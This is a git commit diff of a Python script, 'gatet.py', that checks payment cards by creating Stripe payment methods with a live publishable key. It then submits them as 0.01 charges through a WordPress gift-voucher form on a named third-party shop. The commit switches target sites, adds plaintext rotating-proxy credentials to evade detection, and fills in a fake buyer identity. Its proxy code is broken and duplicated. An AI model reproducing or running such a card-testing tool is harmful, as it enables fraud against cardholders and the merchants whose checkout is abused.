d43bcbd73ddf367182c0e297a2b47a7cf2d63be8
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-14 09:02:17 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -10,6 +10,21 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
+	proxy_list = [
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+]
+
+# Function to randomly select a proxy
+def get_random_proxy():
+    proxy = random.choice(proxy_list)
+    ip, port, username, password = proxy.split(":")
+    proxy_auth = f"http://{username}:{password}@{ip}:{port}"
+    return {"http": proxy_auth, "https": proxy_auth}
+	
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -26,28 +41,48 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51JUSsdLKcbiWYA2XlcI7cM8QwlOlTxhQz7CfoQZVR8EnFzSQGzCagg9Ox7JwOG0edKEiJf4xH47GI5A6gq9m1qo500bgDe2Jtl'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
 	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy, timeout=30)
 	
 	pm = r1.json()['id']
 	
+	proxy_list = [
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
+]
+
+# Function to randomly select a proxy
+def get_random_proxy():
+    proxy = random.choice(proxy_list)
+    ip, port, username, password = proxy.split(":")
+    proxy_auth = f"http://{username}:{password}@{ip}:{port}"
+    return {"http": proxy_auth, "https": proxy_auth}
+	
 	cookies = {
-	    '_gid': 'GA1.2.428777829.1744539054',
-	    '_ga_4MZY34CRTP': 'GS1.1.1744539054.1.0.1744539054.0.0.0',
-	    '_ga': 'GA1.1.264961307.1744539054',
-	    '__stripe_mid': 'edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0',
-	    '__stripe_sid': 'fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
+	    'cookielawinfo-checkbox-necessary': 'yes',
+	    'cookielawinfo-checkbox-functional': 'yes',
+	    'cookielawinfo-checkbox-performance': 'yes',
+	    'cookielawinfo-checkbox-analytics': 'yes',
+	    'cookielawinfo-checkbox-advertisement': 'yes',
+	    'cookielawinfo-checkbox-others': 'yes',
+	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=',
+	    'viewed_cookie_policy': 'yes',
+	    '__stripe_mid': '60b9afb0-f87c-48df-9393-ecad8230aa35719248',
+	    '__stripe_sid': '0fbefb30-5522-4013-9842-09221fb48b02050190',
 	}
 	
 	headers = {
-	    'authority': 'dubaicme.com',
+	    'authority': 'ornamentspa.eu',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_gid=GA1.2.428777829.1744539054; _ga_4MZY34CRTP=GS1.1.1744539054.1.0.1744539054.0.0.0; _ga=GA1.1.264961307.1744539054; __stripe_mid=edc12a34-a5fe-41f7-8a09-b2822039c714bb49b0; __stripe_sid=fe0769ae-fcbb-44f5-900d-f132b60bb11a521a8f',
-	    'origin': 'https://dubaicme.com',
-	    'referer': 'https://dubaicme.com/ws-ehs2025/',
+	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=; viewed_cookie_policy=yes; __stripe_mid=60b9afb0-f87c-48df-9393-ecad8230aa35719248; __stripe_sid=0fbefb30-5522-4013-9842-09221fb48b02050190',
+	    'origin': 'https://ornamentspa.eu',
+	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -59,15 +94,19 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744539195459',
+	    't': '1744595586276',
 	}
 	
-	data = {
-	    'data': '__fluent_form_embded_post_id=32383&_fluentform_81_fluentformnonce=520e088348&_wp_http_referer=%2Fws-ehs2025%2F&input_radio_2=Student%20&Registration_fee=300&dropdown=prof&input_text=Rodam%20User&email=rodamuser08%40gmail.com&phone_1=%2B16046438137&country-list=US&input_text_1=Help&input_text_3=NY&dropdown_1=Dubai&input_radio_1=Ultrasound%20Workshop%0D%0A&custom-payment-amount=2.00&payment_method=stripe&item__81__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
-	    'action': 'fluentform_submit',
-	    'form_id': '81',
-	}
+	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3De4edf751cf%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D0817480671%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
 	
-	r2 = requests.post('https://dubaicme.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post(
+	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	    proxies=proxy,
+	    timeout=30,
+	)
 	
 	return (r2.json())
